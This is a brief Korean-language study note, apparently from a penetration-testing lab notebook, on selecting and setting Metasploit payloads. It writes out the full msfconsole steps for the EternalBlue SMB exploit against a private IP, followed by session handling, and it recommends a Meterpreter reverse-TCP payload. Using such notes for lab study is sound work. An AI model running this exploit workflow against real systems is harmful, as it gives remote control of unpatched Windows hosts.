# payload (msf)

## 개요

`use` 이후 `show payloads`로 후보 payload를 확인하고, `set`으로 세팅한다.

## 흐름

```bash
use exploit/windows/smb/ms17_010_eternalblue
show payloads          # payload 후보 목록
set payload <number>   # 목록에서 선택

show options           # 현재 세팅 확인
set RHOSTS 10.201.63.250
set RPORT 445

exploit                 # 실행
```

## 세션 관리

```bash
# 실행 중 세션이 살아 있으면
sessions -l
sessions -i 1          # 접속해서 명령 주기

# 백그라운드로 보낸 뒤 돌아오기
# (실행 중) Ctrl+Z
# 이후 다시
exploit
sessions -i 1
```

## 팁

- payload 번호는 목록의 순서이며, 번호가 바뀌어도 목록에서 다시 확인한다.
- `windows/x64/meterpreter/reverse_tcp` 같은 64비트 페이로드를 고른다(Windows x64 타깃).
- `windows/meterpreter/reverse_tcp`도 있으나 x64용 payload를 권장한다.
- `set`의 오타(`RHOSTS` vs `RHOST`)는 발동하지 않는다. `show options`로 확인한다.

## 참고 / 증적
- 발견한 내용과 증거는 노트(05-progress-tracker.md)에 함께 기록한다.
